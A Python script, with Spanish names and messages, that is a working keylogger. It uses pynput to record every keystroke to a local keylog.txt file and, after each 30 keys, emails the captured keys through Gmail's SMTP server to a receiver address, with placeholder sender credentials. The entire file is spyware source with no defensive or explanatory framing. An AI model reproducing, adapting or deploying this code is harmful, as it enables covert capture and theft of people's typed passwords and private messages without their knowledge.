
from pynput.keyboard import Key, Listener
import logging
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time

captura = []

def sendEmail(captura):
	now = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
	sender_email = "tu email"
	receiver_email = "su email"
	password = "password"

	message = MIMEMultipart("alternative")
	message["Subject"] = "Nueva captura"
	message["From"] = sender_email
	message["To"] = receiver_email

	text = ("Hora: " + str(now) + "\n  [+] Captura: " + captura)

	part = MIMEText(text, "plain")

	message.attach(part)

	context = ssl.create_default_context()
	with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
		server.login(sender_email, password)
		server.sendmail(
			sender_email, receiver_email, message.as_string()
		)
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
 
def on_press(key):
    logging.info(str(key))
    
    if(str(key) == "Key.space"): 
        captura.append("   ")
    else:
        captura.append(str(key))

    if(len(captura) == 30):

        stringCapture = str(captura).replace("\"",'')
        sendEmail(str(stringCapture))
        print("[+]Captura enviada")
        captura.clear()
       

with Listener(on_press=on_press) as listener :
    listener.join()

